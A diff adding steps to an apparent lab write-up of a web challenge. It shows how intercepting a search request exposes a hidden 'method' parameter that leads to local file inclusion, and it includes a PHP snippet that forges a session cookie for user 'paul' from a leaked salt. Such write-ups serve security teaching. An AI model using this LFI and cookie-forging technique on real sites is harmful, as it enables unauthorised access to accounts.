@@ -36,6 +36,21 @@ published: true
 <p>So i started to test the searching with random word, in my case i used test to understand the behavior</p>
 <p>I got nothing from that, so i will start my proxy "Burpsuite" to intercept that request</p>
 
+<img src="https://i.ibb.co/ggYZMgD/5.png" alt="5" border="0">
+
+<p>After intercepting the request as you can see there is another parameter called "method" we couldn`t see before, now let`s change method value to 1</p>
+
+<img src="https://i.ibb.co/2P0h2CK/6.png" alt="6" border="0">
+
+<p>I managed to generate an error by changing the method value to 1</p>
+<p>The first line error says there is a missing key in the array called book and the second line error says that file_get_content method can`t find the file, so what if we gave it a file to open ?</p>
+
+<img src="https://i.ibb.co/G7KQwy8/7.png" alt="7" border="0">
+
+<p>So now we got LFI and now you can see how the cookie works, now let`s get our first door opened and generate cookie for our entrance</p>
+
+
+<pre><span class="line">function makesession($username) {</span><br><span class="line"></span><br><span class="line">$max = strlen($username) - 1;</span><br><span class="line"></span><br><span class="line">$seed = rand(0, $max);</span><br><span class="line"></span><br><span class="line">$key = "s4lTy_stR1nG_".$username[$seed]."(!528.\/9890";</span><br><span class="line"></span><br><span class="line">$session_cookie = $username.md5($key);</span><br><span class="line"></span><br><span class="line">return $session_cookie;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">echo makesession("paul");</span>><br></pre>
 
 
 
